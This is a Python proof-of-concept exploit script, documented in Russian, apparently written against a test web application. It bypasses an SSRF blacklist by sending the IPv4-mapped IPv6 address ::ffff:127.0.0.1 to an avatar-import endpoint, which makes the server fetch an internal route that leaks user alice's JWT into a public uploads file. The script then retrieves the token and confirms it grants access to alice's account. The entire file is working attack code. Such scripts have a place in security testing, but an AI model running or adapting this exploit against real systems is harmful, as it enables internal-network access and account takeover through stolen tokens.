# -*- coding: utf-8 -*-
"""Обход чёрного списка SSRF через IPv4-mapped IPv6.
Имя хоста ::ffff:127.0.0.1 не равно 127.0.0.1 и ::1, поэтому импорт
ходит на локальный /internal и сохраняет JWT жертвы в /uploads.

    python 04_ssrf_ipv6.py
"""
import time

from _http import Client, parser


def main():
    args = parser("SSRF через IPv4-mapped IPv6").parse_args()
    p = args
    client = Client(p.base)
    stamp = str(int(time.time()))[-6:]
    token = client.register(f"v6{stamp}", f"v6{stamp}@poc.local", "Passw0rd!v6")
    url = "http://[::ffff:127.0.0.1]:8080/internal/users/alice/token"
    status, data, blob = client.call(
        "POST",
        "/api/user/avatar/import",
        token=token,
        body={"url": url},
        timeout=12,
    )
    if status != 200 or not data:
        raise SystemExit(f"импорт не удался: {status} {blob[:250]!r}")
    image = data["user"].get("image") or ""
    status, parsed, blob = client.call("GET", image)
    if status != 200 or not parsed or "token" not in parsed:
        raise SystemExit(f"файл не содержит JWT: {status} {blob[:200]!r}")
    status, who, blob = client.call("GET", "/api/user", token=parsed["token"])
    if status != 200 or who["user"]["username"] != "alice":
        raise SystemExit(f"токен не открыл alice: {status} {blob[:200]!r}")
    print(f"OK {url}")
    print(f"файл {image} -> {who['user']['email']}")


if __name__ == "__main__":
    main()
